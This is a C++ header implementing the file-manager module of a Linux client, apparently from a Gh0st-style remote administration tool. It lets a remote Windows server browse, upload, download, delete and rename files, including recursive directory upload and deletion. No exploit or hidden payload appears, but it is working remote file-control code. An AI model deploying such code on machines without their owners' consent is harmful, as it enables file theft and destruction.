#pragma once
#include <dirent.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <iconv.h>
#include <unistd.h>
#include <cstring>
#include <string>
#include <vector>
#include <list>
#include <fstream>
#include <sstream>
#include <cerrno>

// ============== Linux File Manager ==============
// Implements file transfer between Windows server and Linux client
// Supports: browse, upload, download, delete, rename, create folder

#define MAX_SEND_BUFFER 65535

class FileManager : public IOCPManager
{
public:
    FileManager(IOCPClient* client)
        : m_client(client),
          m_nTransferMode(TRANSFER_MODE_NORMAL),
          m_nCurrentFileLength(0),
          m_nCurrentUploadFileLength(0)
    {
        memset(m_strCurrentFileName, 0, sizeof(m_strCurrentFileName));
        memset(m_strCurrentUploadFile, 0, sizeof(m_strCurrentUploadFile));
        SendDriveList();
    }

    ~FileManager()
    {
        m_uploadList.clear();
    }

    virtual VOID OnReceive(PBYTE szBuffer, ULONG ulLength)
    {
        if (!szBuffer || ulLength == 0) return;

        switch (szBuffer[0]) {
        case COMMAND_LIST_FILES:
            SendFilesList((char*)szBuffer + 1);
            break;

        case COMMAND_DELETE_FILE:
            DeleteSingleFile((char*)szBuffer + 1);
            SendToken(TOKEN_DELETE_FINISH);
            break;

        case COMMAND_DELETE_DIRECTORY:
            DeleteDirectoryRecursive((char*)szBuffer + 1);
            SendToken(TOKEN_DELETE_FINISH);
            break;

        case COMMAND_DOWN_FILES:
            // Server wants to download files FROM Linux (upload from Linux perspective)
            UploadToRemote((char*)szBuffer + 1);
            break;

        case COMMAND_CONTINUE:
            // Server requests next chunk of file data
            SendFileData(szBuffer + 1);
            break;

        case COMMAND_STOP:
            StopTransfer();
            break;

        case COMMAND_CREATE_FOLDER:
            CreateFolder((char*)szBuffer + 1);
            break;

        case COMMAND_RENAME_FILE:
            RenameFile(szBuffer + 1);
            break;

        case COMMAND_SET_TRANSFER_MODE:
            SetTransferMode(szBuffer + 1);
            break;

        case COMMAND_FILE_SIZE:
            // Server wants to upload a file TO Linux (download from Linux perspective)
            CreateLocalRecvFile(szBuffer + 1);
            break;

        case COMMAND_FILE_DATA:
            // Server sends file data chunk
            WriteLocalRecvFile(szBuffer + 1, ulLength - 1);
            break;

        default:
            Mprintf("[FileManager] Unhandled command: %d\n", (int)szBuffer[0]);
            break;
        }
    }

private:
    IOCPClient* m_client;

    // Upload state (Linux -> Windows)
    std::list<std::string> m_uploadList;
    char m_strCurrentUploadFile[4096];
    int64_t m_nCurrentUploadFileLength;

    // Download state (Windows -> Linux)
    char m_strCurrentFileName[4096];
    int64_t m_nCurrentFileLength;
    int m_nTransferMode;

    // ---- Send single byte token ----
    void SendToken(BYTE token)
    {
        if (!m_client) return;
        m_client->Send2Server((char*)&token, 1);
    }

    // ---- iconv encoding conversion ----
    static std::string iconvConvert(const std::string& input, const char* from, const char* to)
    {
        if (input.empty()) return input;
        iconv_t cd = iconv_open(to, from);
        if (cd == (iconv_t)-1) return input;

        size_t inLeft = input.size();
        size_t outLeft = inLeft * 4;
        std::string output(outLeft, '\0');

        char* inPtr  = const_cast<char*>(input.data());
        char* outPtr = &output[0];

        size_t ret = iconv(cd, &inPtr, &inLeft, &outPtr, &outLeft);
        iconv_close(cd);

        if (ret == (size_t)-1) return input;
        output.resize(output.size() - outLeft);
        return output;
    }

    static std::string gbkToUtf8(const std::string& gbk)
    {
        return iconvConvert(gbk, "GBK", "UTF-8");
    }

    static std::string utf8ToGbk(const std::string& utf8)
    {
        return iconvConvert(utf8, "UTF-8", "GBK");
    }

    // ---- Windows path -> Linux path ----
    // Examples:
    //   /:\home\user\file.txt -> /home/user/file.txt
    //   /:\home\user\ -> /home/user/
    //   /:\ -> /
    //   /: -> /
    //   C:\Users\file.txt -> /Users/file.txt
    static std::string winPathToLinux(const char* winPath)
    {
        if (!winPath || !*winPath) return "/";

        std::string p(winPath);
        // 1. Backslash -> forward slash
        for (auto& c : p) {
            if (c == '\\') c = '/';
        }
        // 2. Remove "X:/" or "X:" prefix (handles both /: and C: style)
        if (p.size() >= 3 && p[1] == ':' && p[2] == '/') {
            p = p.substr(3);
        } else if (p.size() >= 2 && p[1] == ':') {
            p = p.substr(2);
        }
        // 3. Ensure starts with /
        if (p.empty() || p[0] != '/') {
            p = "/" + p;
        }
        // 4. Merge consecutive slashes
        std::string result;
        result.reserve(p.size());
        for (size_t i = 0; i < p.size(); i++) {
            if (i > 0 && p[i] == '/' && p[i - 1] == '/')
                continue;
            result += p[i];
        }
        return result.empty() ? "/" : result;
    }

    // ---- Linux path -> Windows path (for sending to server) ----
    // Converts /home/user/file.txt to /:\home\user\file.txt
    static std::string linuxPathToWin(const std::string& linuxPath)
    {
        // Start with drive letter representation /: for Linux root
        // Linux path /home/user/file.txt should become /:\home\user\file.txt
        std::string result = "/:";
        if (!linuxPath.empty()) {
            result += linuxPath;
        }
        // Convert all forward slashes to backslashes (except the leading /:)
        for (size_t i = 2; i < result.size(); ++i) {
            if (result[i] == '/') result[i] = '\\';
        }
        return result;
    }

    // ---- Unix time_t -> Windows FILETIME ----
    static uint64_t unixToFiletime(time_t t)
    {
        return (uint64_t)t * 10000000ULL + 116444736000000000ULL;
    }

    // ---- Get root filesystem type ----
    static std::string getRootFsType()
    {
        std::ifstream f("/proc/mounts");
        std::string line;
        while (std::getline(f, line)) {
            std::istringstream iss(line);
            std::string dev, mp, fs;
            if (iss >> dev >> mp >> fs) {
                if (mp == "/") return fs;
            }
        }
        return "ext4";
    }

    // ---- Ensure parent directory exists (mkdir -p for parent of file path) ----
    bool MakeSureDirectoryExists(const std::string& filePath)
    {
        // Get parent directory
        std::string dir;
        size_t lastSlash = filePath.rfind('/');
        if (lastSlash != std::string::npos && lastSlash > 0) {
            dir = filePath.substr(0, lastSlash);
        } else {
            // No parent directory to create
            return true;
        }

        // Create directories recursively
        std::string current;
        for (size_t i = 0; i < dir.size(); ++i) {
            current += dir[i];
            if (dir[i] == '/' && current.size() > 1) {
                mkdir(current.c_str(), 0755);
            }
        }
        if (!current.empty() && current != "/") {
            mkdir(current.c_str(), 0755);
        }
        return true;
    }

    // ---- Ensure directory path exists (mkdir -p for directory path) ----
    bool MakeSureDirectoryPathExists(const std::string& dirPath)
    {
        std::string dir = dirPath;
        // Remove trailing slash
        while (!dir.empty() && dir.back() == '/') {
            dir.pop_back();
        }

        // Create directories recursively
        std::string current;
        for (size_t i = 0; i < dir.size(); ++i) {
            current += dir[i];
            if (dir[i] == '/' && current.size() > 1) {
                mkdir(current.c_str(), 0755);
            }
        }
        if (!current.empty() && current != "/") {
            mkdir(current.c_str(), 0755);
        }
        return true;
    }

    // ---- Send drive list (Linux: root partition /) ----
    void SendDriveList()
    {
        if (!m_client) return;

        BYTE buf[256];
        buf[0] = (BYTE)TOKEN_DRIVE_LIST;
        DWORD offset = 1;

        buf[offset] = '/';
        buf[offset + 1] = 3; // DRIVE_FIXED

        unsigned long totalMB = 0, freeMB = 0;
        struct statvfs sv;
        if (statvfs("/", &sv) == 0) {
            unsigned long long totalBytes = (unsigned long long)sv.f_blocks * sv.f_frsize;
            unsigned long long freeBytes  = (unsigned long long)sv.f_bfree  * sv.f_frsize;
            totalMB = (unsigned long)(totalBytes / 1024 / 1024);
            freeMB  = (unsigned long)(freeBytes  / 1024 / 1024);
        }
        memcpy(buf + offset + 2, &totalMB, sizeof(unsigned long));
        memcpy(buf + offset + 6, &freeMB,  sizeof(unsigned long));

        const char* typeName = "Linux";
        int typeNameLen = strlen(typeName) + 1;
        memcpy(buf + offset + 10, typeName, typeNameLen);

        std::string fsType = getRootFsType();
        int fsNameLen = fsType.size() + 1;
        memcpy(buf + offset + 10 + typeNameLen, fsType.c_str(), fsNameLen);

        offset += 10 + typeNameLen + fsNameLen;

        m_client->Send2Server((char*)buf, offset);
    }

    // ---- Send file list for directory ----
    void SendFilesList(const char* path)
    {
        if (!m_client) return;

        m_nTransferMode = TRANSFER_MODE_NORMAL;
        std::string linuxPath = winPathToLinux(gbkToUtf8(path).c_str());

        std::vector<uint8_t> buf;
        buf.reserve(64 * 1024);
        buf.push_back((uint8_t)TOKEN_FILE_LIST);

        DIR* dir = opendir(linuxPath.c_str());
        if (!dir) {
            Mprintf("[FileManager] opendir failed: %s (errno=%d)\n", linuxPath.c_str(), errno);
            m_client->Send2Server((char*)buf.data(), (ULONG)buf.size());
            return;
        }

        struct dirent* ent;
        while ((ent = readdir(dir)) != nullptr) {
            if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
                continue;

            std::string fullPath = linuxPath;
            if (fullPath.back() != '/') fullPath += '/';
            fullPath += ent->d_name;

            struct stat st;
            if (lstat(fullPath.c_str(), &st) != 0)
                continue;

            uint8_t isDir = S_ISDIR(st.st_mode) ? 0x10 : 0x00;
            buf.push_back(isDir);

            std::string gbkName = utf8ToGbk(ent->d_name);
            buf.insert(buf.end(), gbkName.begin(), gbkName.end());
            buf.push_back(0);

            uint64_t fileSize = (uint64_t)st.st_size;
            DWORD sizeHigh = (DWORD)(fileSize >> 32);
            DWORD sizeLow  = (DWORD)(fileSize & 0xFFFFFFFF);
            const uint8_t* pH = (const uint8_t*)&sizeHigh;
            const uint8_t* pL = (const uint8_t*)&sizeLow;
            buf.insert(buf.end(), pH, pH + sizeof(DWORD));
            buf.insert(buf.end(), pL, pL + sizeof(DWORD));

            uint64_t ft = unixToFiletime(st.st_mtime);
            const uint8_t* pFT = (const uint8_t*)&ft;
            buf.insert(buf.end(), pFT, pFT + 8);
        }
        closedir(dir);

        m_client->Send2Server((char*)buf.data(), (ULONG)buf.size());
    }

    // ============== File Upload (Linux -> Windows) ==============

    // Build file list for directory upload
    bool BuildUploadList(const std::string& pathName)
    {
        std::string linuxPath = winPathToLinux(gbkToUtf8(pathName).c_str());

        DIR* dir = opendir(linuxPath.c_str());
        if (!dir) return false;

        struct dirent* ent;
        while ((ent = readdir(dir)) != nullptr) {
            if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
                continue;

            std::string fullPath = linuxPath;
            if (fullPath.back() != '/') fullPath += '/';
            fullPath += ent->d_name;

            struct stat st;
            if (lstat(fullPath.c_str(), &st) != 0)
                continue;

            if (S_ISDIR(st.st_mode)) {
                // Recursively add directory contents
                std::string winPath = linuxPathToWin(fullPath);
                BuildUploadList(winPath.c_str());
            } else if (S_ISREG(st.st_mode)) {
                // Add file to upload list
                std::string winPath = linuxPathToWin(fullPath);
                m_uploadList.push_back(utf8ToGbk(winPath));
            }
        }
        closedir(dir);
        return true;
    }

    // Start upload process
    void UploadToRemote(const char* filePath)
    {
        // Clear any previous upload state
        m_uploadList.clear();
        m_nCurrentUploadFileLength = 0;
        memset(m_strCurrentUploadFile, 0, sizeof(m_strCurrentUploadFile));

        std::string path(filePath);

        // Check if it's a directory (ends with backslash)
        if (!path.empty() && path.back() == '\\') {
            BuildUploadList(path);
            Mprintf("[FileManager] Upload: %zu files from directory\n", m_uploadList.size());
            if (m_uploadList.empty()) {
                StopTransfer();
                return;
            }
        } else {
            m_uploadList.push_back(path);
        }

        // Send first file size
        SendFileSize(m_uploadList.front().c_str());
    }

    // Send file size to initiate transfer
    void SendFileSize(const char* fileName)
    {
        std::string linuxPath = winPathToLinux(gbkToUtf8(fileName).c_str());

        // Save current file being processed
        strncpy(m_strCurrentUploadFile, linuxPath.c_str(), sizeof(m_strCurrentUploadFile) - 1);
        m_strCurrentUploadFile[sizeof(m_strCurrentUploadFile) - 1] = '\0';

        struct stat st;
        if (stat(linuxPath.c_str(), &st) != 0) {
            Mprintf("[FileManager] stat failed: %s (errno=%d)\n", linuxPath.c_str(), errno);
            // Skip this file and try next
            if (!m_uploadList.empty()) {
                m_uploadList.pop_front();
            }
            if (m_uploadList.empty()) {
                SendToken(TOKEN_TRANSFER_FINISH);
            } else {
                SendFileSize(m_uploadList.front().c_str());
            }
            return;
        }

        uint64_t fileSize = (uint64_t)st.st_size;
        m_nCurrentUploadFileLength = fileSize;
        DWORD sizeHigh = (DWORD)(fileSize >> 32);
        DWORD sizeLow  = (DWORD)(fileSize & 0xFFFFFFFF);

        Mprintf("[FileManager] Upload: %s (%lld bytes)\n", linuxPath.c_str(), (long long)fileSize);

        // Build packet: TOKEN_FILE_SIZE + sizeHigh + sizeLow + fileName
        int packetSize = strlen(fileName) + 10;
        std::vector<BYTE> packet(packetSize, 0);

        packet[0] = TOKEN_FILE_SIZE;
        memcpy(&packet[1], &sizeHigh, sizeof(DWORD));
        memcpy(&packet[5], &sizeLow, sizeof(DWORD));
        memcpy(&packet[9], fileName, strlen(fileName) + 1);

        m_client->Send2Server((char*)packet.data(), packetSize);
    }

    // Send file data chunk
    void SendFileData(PBYTE lpBuffer)
    {
        // Parse offset from COMMAND_CONTINUE
        // Format: [offsetHigh:4bytes][offsetLow:4bytes]
        DWORD offsetHigh = 0, offsetLow = 0;
        memcpy(&offsetHigh, lpBuffer, sizeof(DWORD));
        memcpy(&offsetLow, lpBuffer + 4, sizeof(DWORD));

        // Skip signal: offsetLow == 0xFFFFFFFF (server wants to skip this file)
        if (offsetLow == 0xFFFFFFFF) {
            UploadNext();
            return;
        }

        int64_t offset = ((int64_t)offsetHigh << 32) | offsetLow;

        // Check if we've reached the end of file
        if (offset >= m_nCurrentUploadFileLength) {
            UploadNext();
            return;
        }

        FILE* fp = fopen(m_strCurrentUploadFile, "rb");
        if (!fp) {
            Mprintf("[FileManager] fopen failed: %s (errno=%d)\n", m_strCurrentUploadFile, errno);
            SendTransferFinishForCurrentFile();
            return;
        }

        if (fseeko(fp, offset, SEEK_SET) != 0) {
            Mprintf("[FileManager] fseeko failed (errno=%d)\n", errno);
            fclose(fp);
            SendTransferFinishForCurrentFile();
            return;
        }

        const int headerLen = 9; // 1 + 4 + 4
        const int maxDataSize = MAX_SEND_BUFFER - headerLen;

        std::vector<BYTE> packet(MAX_SEND_BUFFER);
        packet[0] = TOKEN_FILE_DATA;
        memcpy(&packet[1], &offsetHigh, sizeof(DWORD));
        memcpy(&packet[5], &offsetLow, sizeof(DWORD));

        size_t bytesRead = fread(&packet[headerLen], 1, maxDataSize, fp);
        int readErr = ferror(fp);
        fclose(fp);

        if (readErr) {
            Mprintf("[FileManager] fread error (errno=%d)\n", errno);
            SendTransferFinishForCurrentFile();
            return;
        }

        if (bytesRead > 0) {
            int packetSize = headerLen + bytesRead;
            m_client->Send2Server((char*)packet.data(), packetSize);
        } else {
            // No more data, proceed to next file
            UploadNext();
        }
    }

    // Helper: finish current file transfer gracefully
    void SendTransferFinishForCurrentFile()
    {
        if (!m_uploadList.empty()) {
            m_uploadList.pop_front();
        }
        if (m_uploadList.empty()) {
            SendToken(TOKEN_TRANSFER_FINISH);
        } else {
            SendFileSize(m_uploadList.front().c_str());
        }
    }

    // Move to next file in upload queue
    void UploadNext()
    {
        SendTransferFinishForCurrentFile();
    }

    void StopTransfer()
    {
        // Clear upload state
        m_uploadList.clear();
        m_nCurrentUploadFileLength = 0;
        memset(m_strCurrentUploadFile, 0, sizeof(m_strCurrentUploadFile));
        // Clear download state
        m_nCurrentFileLength = 0;
        memset(m_strCurrentFileName, 0, sizeof(m_strCurrentFileName));

        SendToken(TOKEN_TRANSFER_FINISH);
    }

    // ============== File Download (Windows -> Linux) ==============

    // Create local file for receiving
    void CreateLocalRecvFile(PBYTE lpBuffer)
    {
        // Clear previous download state
        memset(m_strCurrentFileName, 0, sizeof(m_strCurrentFileName));

        DWORD sizeHigh = 0, sizeLow = 0;
        memcpy(&sizeHigh, lpBuffer, sizeof(DWORD));
        memcpy(&sizeLow, lpBuffer + 4, sizeof(DWORD));

        m_nCurrentFileLength = ((int64_t)sizeHigh << 32) | sizeLow;

        // Get file name (after 8 bytes of size)
        const char* fileName = (const char*)(lpBuffer + 8);
        std::string linuxPath = winPathToLinux(gbkToUtf8(fileName).c_str());

        strncpy(m_strCurrentFileName, linuxPath.c_str(), sizeof(m_strCurrentFileName) - 1);
        m_strCurrentFileName[sizeof(m_strCurrentFileName) - 1] = '\0';

        Mprintf("[FileManager] Download: %s (%lld bytes)\n",
                m_strCurrentFileName, (long long)m_nCurrentFileLength);

        // Create parent directories
        MakeSureDirectoryExists(m_strCurrentFileName);

        // Check if file exists
        struct stat st;
        bool fileExists = (stat(m_strCurrentFileName, &st) == 0);

        // Determine effective transfer mode
        int nTransferMode = m_nTransferMode;
        switch (m_nTransferMode) {
            case TRANSFER_MODE_OVERWRITE_ALL:
                nTransferMode = TRANSFER_MODE_OVERWRITE;
                break;
            case TRANSFER_MODE_ADDITION_ALL:
                nTransferMode = TRANSFER_MODE_ADDITION;
                break;
            case TRANSFER_MODE_JUMP_ALL:
                nTransferMode = TRANSFER_MODE_JUMP;
                break;
            case TRANSFER_MODE_NORMAL:
                // For Linux without UI, default to overwrite when file exists
                nTransferMode = TRANSFER_MODE_OVERWRITE;
                break;
        }

        BYTE response[9] = {0};
        response[0] = TOKEN_DATA_CONTINUE;

        if (fileExists) {
            if (nTransferMode == TRANSFER_MODE_ADDITION) {
                // Resume: send existing file size as offset
                uint64_t existingSize = st.st_size;
                DWORD existHigh = (DWORD)(existingSize >> 32);
                DWORD existLow  = (DWORD)(existingSize & 0xFFFFFFFF);
                memcpy(response + 1, &existHigh, sizeof(DWORD));
                memcpy(response + 5, &existLow, sizeof(DWORD));
            } else if (nTransferMode == TRANSFER_MODE_JUMP) {
                // Skip this file
                DWORD skip = 0xFFFFFFFF;
                memcpy(response + 5, &skip, sizeof(DWORD));
            }
            // TRANSFER_MODE_OVERWRITE: offset stays 0, file will be truncated
        }

        // Create or truncate file (unless skipping)
        DWORD lowCheck = 0;
        memcpy(&lowCheck, response + 5, sizeof(DWORD));
        if (lowCheck != 0xFFFFFFFF) {
            const char* mode = (nTransferMode == TRANSFER_MODE_ADDITION && fileExists) ? "r+b" : "wb";
            FILE* fp = fopen(m_strCurrentFileName, mode);
            if (fp) {
                if (nTransferMode == TRANSFER_MODE_ADDITION && fileExists) {
                    // Seek to end for append mode
                    fseeko(fp, 0, SEEK_END);
                }
                fclose(fp);
            } else {
                Mprintf("[FileManager] fopen failed: %s (errno=%d)\n", m_strCurrentFileName, errno);
            }
        }

        m_client->Send2Server((char*)response, sizeof(response));
    }

    // Write received file data
    void WriteLocalRecvFile(PBYTE lpBuffer, ULONG nSize)
    {
        if (nSize < 8) return;

        DWORD offsetHigh = 0, offsetLow = 0;
        memcpy(&offsetHigh, lpBuffer, sizeof(DWORD));
        memcpy(&offsetLow, lpBuffer + 4, sizeof(DWORD));

        int64_t offset = ((int64_t)offsetHigh << 32) | offsetLow;
        ULONG dataLen = nSize - 8;
        PBYTE data = lpBuffer + 8;

        FILE* fp = fopen(m_strCurrentFileName, "r+b");
        if (!fp) {
            fp = fopen(m_strCurrentFileName, "wb");
        }
        if (!fp) {
            Mprintf("[FileManager] fopen failed: %s (errno=%d)\n", m_strCurrentFileName, errno);
            // Send error response - skip to end
            BYTE response[9] = {0};
            response[0] = TOKEN_DATA_CONTINUE;
            DWORD skip = 0xFFFFFFFF;
            memcpy(response + 5, &skip, sizeof(DWORD));
            m_client->Send2Server((char*)response, sizeof(response));
            return;
        }

        if (fseeko(fp, offset, SEEK_SET) != 0) {
            Mprintf("[FileManager] fseeko failed (errno=%d)\n", errno);
            fclose(fp);
            // Send skip response to avoid server hanging
            BYTE response[9] = {0};
            response[0] = TOKEN_DATA_CONTINUE;
            DWORD skip = 0xFFFFFFFF;
            memcpy(response + 5, &skip, sizeof(DWORD));
            m_client->Send2Server((char*)response, sizeof(response));
            return;
        }

        size_t written = fwrite(data, 1, dataLen, fp);
        if (written != dataLen) {
            Mprintf("[FileManager] WriteLocalRecvFile: fwrite incomplete (%zu/%lu, errno=%d)\n",
                    written, (unsigned long)dataLen, errno);
        }
        fclose(fp);

        // Calculate new offset with proper 64-bit arithmetic
        int64_t newOffset = offset + written;
        DWORD newOffsetHigh = (DWORD)(newOffset >> 32);
        DWORD newOffsetLow = (DWORD)(newOffset & 0xFFFFFFFF);

        // Send continue with new offset
        BYTE response[9];
        response[0] = TOKEN_DATA_CONTINUE;
        memcpy(response + 1, &newOffsetHigh, sizeof(DWORD));
        memcpy(response + 5, &newOffsetLow, sizeof(DWORD));
        m_client->Send2Server((char*)response, sizeof(response));
    }

    void SetTransferMode(PBYTE lpBuffer)
    {
        memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
    }

    // ============== File Operations ==============

    void DeleteSingleFile(const char* fileName)
    {
        std::string linuxPath = winPathToLinux(gbkToUtf8(fileName).c_str());
        if (unlink(linuxPath.c_str()) != 0) {
            Mprintf("[FileManager] unlink failed: %s (errno=%d)\n", linuxPath.c_str(), errno);
        }
    }

    void DeleteDirectoryRecursive(const char* dirPath)
    {
        std::string linuxPath = winPathToLinux(gbkToUtf8(dirPath).c_str());
        // Remove trailing slash
        while (!linuxPath.empty() && linuxPath.back() == '/') {
            linuxPath.pop_back();
        }

        DeleteDirectoryRecursiveInternal(linuxPath);
    }

    // Internal recursive delete using Linux paths directly (no encoding conversion)
    void DeleteDirectoryRecursiveInternal(const std::string& linuxPath)
    {
        DIR* dir = opendir(linuxPath.c_str());
        if (!dir) {
            Mprintf("[FileManager] opendir failed: %s (errno=%d)\n", linuxPath.c_str(), errno);
            return;
        }

        struct dirent* ent;
        while ((ent = readdir(dir)) != nullptr) {
            if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
                continue;

            std::string fullPath = linuxPath + "/" + ent->d_name;
            struct stat st;
            if (lstat(fullPath.c_str(), &st) != 0)
                continue;

            if (S_ISDIR(st.st_mode)) {
                DeleteDirectoryRecursiveInternal(fullPath);
            } else {
                unlink(fullPath.c_str());
            }
        }
        closedir(dir);

        if (rmdir(linuxPath.c_str()) != 0) {
            Mprintf("[FileManager] rmdir failed: %s (errno=%d)\n", linuxPath.c_str(), errno);
        }
    }

    void CreateFolder(const char* folderPath)
    {
        std::string linuxPath = winPathToLinux(gbkToUtf8(folderPath).c_str());
        MakeSureDirectoryPathExists(linuxPath);
        SendToken(TOKEN_CREATEFOLDER_FINISH);
    }

    void RenameFile(PBYTE lpBuffer)
    {
        const char* oldName = (const char*)lpBuffer;
        const char* newName = oldName + strlen(oldName) + 1;

        std::string oldPath = winPathToLinux(gbkToUtf8(oldName).c_str());
        std::string newPath = winPathToLinux(gbkToUtf8(newName).c_str());

        if (rename(oldPath.c_str(), newPath.c_str()) != 0) {
            Mprintf("[FileManager] rename failed: %s (errno=%d)\n", oldPath.c_str(), errno);
        }
        SendToken(TOKEN_RENAME_FINISH);
    }
};
